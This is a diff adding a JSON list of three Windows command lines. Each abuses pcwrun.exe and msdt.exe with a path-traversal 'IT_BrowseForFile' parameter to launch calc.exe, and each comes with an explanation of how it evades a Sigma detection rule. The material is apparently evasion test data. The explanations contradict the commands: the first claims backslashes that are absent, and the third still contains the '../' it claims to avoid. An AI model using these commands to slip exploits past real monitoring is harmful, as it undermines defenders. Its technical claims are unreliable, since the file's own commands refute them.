@@ -1,0 +1,14 @@
+[
+  {
+    "output": "pcwrun.exe C:\\Windows\\System32\\msdt.exe /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=../../../../../../Windows/System32/calc.exe\"",
+    "explanation": "The original Sigma rule looks for the literal string '../' in the command line. An attacker can bypass this by using backslashes ('..\\') instead of forward slashes, which perform the same directory traversal function in the Windows shell and API but fail to trigger the specific string match 'selection' in the rule."
+  },
+  {
+    "output": "pcwrun.exe \"C:\\Windows\\System32\\msdt.exe\" /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=.^./.^./Windows/System32/calc.exe\"",
+    "explanation": "This bypass uses the Windows command-line escape character (^) between the dots and the slash. The command interpreter strips the carets before execution, resulting in a functional traversal, but the Sigma rule's 'contains' logic fails because the literal string '../' is not present in the raw CommandLine log."
+  },
+  {
+    "output": "pcwrun.exe \"C:\\Windows\\System32\\msdt.exe\" /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=..//..//..//Windows/System32/calc.exe\"",
+    "explanation": "The rule specifically targets the single forward slash sequence. Using double forward slashes ('..//') is often normalized by the Windows filesystem API to a single slash, allowing the exploit to function while avoiding the specific pattern match defined in the detection logic."
+  }
+]
